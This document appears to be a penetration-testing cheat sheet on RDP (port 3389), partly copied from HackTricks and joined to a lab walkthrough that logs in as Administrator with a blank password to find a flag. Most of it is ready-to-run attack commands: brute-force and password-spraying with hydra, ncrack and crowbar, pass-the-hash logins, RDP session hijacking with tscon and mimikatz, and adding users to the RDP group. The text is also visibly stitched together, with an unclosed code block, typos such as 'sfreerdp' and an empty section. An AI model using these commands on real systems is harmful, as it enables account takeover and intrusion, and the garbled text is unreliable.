# 3389 rdp

## Description

source: https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp

Basic information about RDP service: Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft, which provides a user with a graphical interface to connect to another computer over a network connection. The user employs RDP client software for this purpose, while the other computer must run RDP server software (from here).


| Name | Description |
| ---- | ----------- |
| port | 3389/TCP | 
| state | open |
| service | ms-wbt-server |   
| version | Microsoft Terminal Services |
| Banner | rdp-ntlm-info |


## Enumeration: 

To check the available encryption and DoS vulnerability (without causing DoS to the service) and obtains NTLM Windows info (versions).

```bash
nmap -Pn -sV -p3389 --script rdp-*  IP
```

Results:
```

One of the most long-standing and major features of Windows is Remote Desktop. To run Microsoftâ€™s Remote Desktop Protocol (RDP) client, a command-line interface called Microsoft Terminal Services Client (MSTSC) is used.

As mentioned before, we will be using xfreerdp to connect from our Parrot Security virtual machine. You can check if you have xfreerdp installed by typing the command name in the terminal. If the script's help menu is output to the terminal, then you are ready to go. In the following screenshot, we have omitted a large part of the output for space considerations. The help menu for this script is vast, and you can find out much information about the functionality of each switch if you read through it.

If you need to install xfreerdp, you can proceed with the following command: 

```
sudo apt-get install freerdp2-x11
```

We can first try to form an RDP session with the target by not providing any additional information for any switches other than the target IP address. This will make the script use your own username as the login username for the RDP session, thus testing guest login capabilities.

```
#/v:{target_IP} : Specifies the target IP of the host we would like to connect to.
sfreerdp /v:10.129.1.13
```

As we can see from the output below, our own username is not accepted for the RDP session login mechanism. We can try a myriad of other default accounts, such as user , admin , Administrator , and so on. In reality, this would be a time-consuming process. However, for the sake of RDP exploration, let us attempt logging in with the Administrator user, as seen from the commands below. We will also be specifying to the script that we would like to bypass all requirements for a security certificate so that our own script does not request them. The target, in this case, already does not expect any. Let us take a look at the switches we will need to use with xfreerdp in order to connect to our target in this scenario successfully:

```
# /cert:ignore : Specifies to the scrips that all security certificate usage should be ignored.
# /u:Administrator : Specifies the login username to be "Administrator".
# /v:{target_IP} : Specifies the target IP of the host we would like to connect to.
sfreerdp /cert:ignore /u:Administrator /v:10.129.1.13
```

The output is different this time, and during the initialization of the RDP session, we are asked for a Password. In our case, the Administrator account has not been configured with a password for logging in for the sake of accessibility for the end-user. This is a severe mishap in configuration and will result in us, the attacker, gaining access to the machine without much effort. When prompted to enter the Password like in the output above, we can hit Enter to let the process continue without one. Following this, a large output will be displayed on our terminal before a remote desktop window is loaded. The flag we are looking for is located on the Desktop.

## Brute force

```
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
```
Be careful, you could lock accounts

## Password Spraying
Be careful, you could lock accounts
```
# https://github.com/galkan/crowbar
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
# hydra
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

## Connect with known credentials/hash

```
rdesktop -u <username> <IP>
rdesktop -d <domain> -u <username> -p <password> <IP>
xfreerdp [/d:domain] /u:<username> /p:<password> /v:<IP>
xfreerdp [/d:domain] /u:<username> /pth:<hash> /v:<IP> #Pass the hash
```

Check known credentials against RDP services

rdp_check.py from impacket let you check if some credentials are valid for a RDP service:

```
rdp_check <domain>/<name>:<password>@<IP>
```

## Attacks

### Session stealing

With SYSTEM permissions you can access any opened RDP session by any user without need to know the password of the owner.

Get openned sessions:
```
query user
```

Access to the selected session
```
tscon <ID> /dest:<SESSIONNAME>
```

Now you will be inside the selected RDP session and you will have impersonate a user using only Windows tools and features.

Important: When you access an active RDP sessions you will kickoff the user that was using it.
You could get passwords from the process dumping it, but this method is much faster and led you interact with the virtual desktops of the user (passwords in notepad without been saved in disk, other RDP sessions opened in other machines...)

### Mimikatz

You could also use mimikatz to do this:
```
ts::sessions #Get sessions
ts::remote /id:2 #Connect to the session
```

Sticky-keys & Utilman
Combining this technique with stickykeys or utilman you will be able to access a administrative CMD and any RDP session anytime

You can search RDPs that have been backdoored with one of these techniques already with: https://github.com/linuz/Sticky-Keys-Slayer


### RDP Process Injection

If someone from a different domain or with better privileges login via RDP to the PC where you are an Admin, you can inject your beacon in his RDP session process and act as him:

### RDP Sessions Abuse

```
# Adding User to RDP group
net localgroup "Remote Desktop Users" UserLoginName /add
```

#### Shadow Attack

AutoRDPwn is a post-exploitation framework created in Powershell, designed primarily to automate the Shadow attack on Microsoft Windows computers. This vulnerability (listed as a feature by Microsoft) allows a remote attacker to view his victim's desktop without his consent, and even control it on demand, using tools native to the operating system itself.
